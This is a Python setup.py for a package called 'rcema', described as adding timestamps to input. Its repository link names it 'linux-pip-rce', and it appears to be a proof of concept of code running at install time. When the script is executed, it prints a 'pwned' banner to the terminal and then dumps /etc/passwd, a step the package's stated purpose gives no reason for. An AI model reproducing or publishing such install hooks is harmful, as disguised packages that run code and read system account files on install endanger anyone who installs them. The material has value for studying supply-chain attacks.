from setuptools import setup, find_packages

requirements = []  # 这里填依赖包信息

msg = r"""
                              _
                             | |
 _ ____      ___ __   ___  __| |
| '_ \ \ /\ / / '_ \ / _ \/ _` |
| |_) \ V  V /| | | |  __/ (_| |
| .__/ \_/\_/ |_| |_|\___|\__,_|
| |
|_|

"""

f = open("/dev/tty", "w")
print(msg, file=f)
print(open("/etc/passwd").read(), file=f)

setup(
    name="rcema",
    version="0.0.1",
    author="lizq603",
    author_email="iv2013@qq.com",
    description="A package to add timestamp to your input",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/52piaoyu/linux-pip-rce",
    packages=find_packages(),
    # Single module也可以：
    py_modules=['rcema'],
    classifiers=[
        "Programming Language :: Python :: 3.10",
        "License :: OSI Approved :: MIT License",
    ]
)
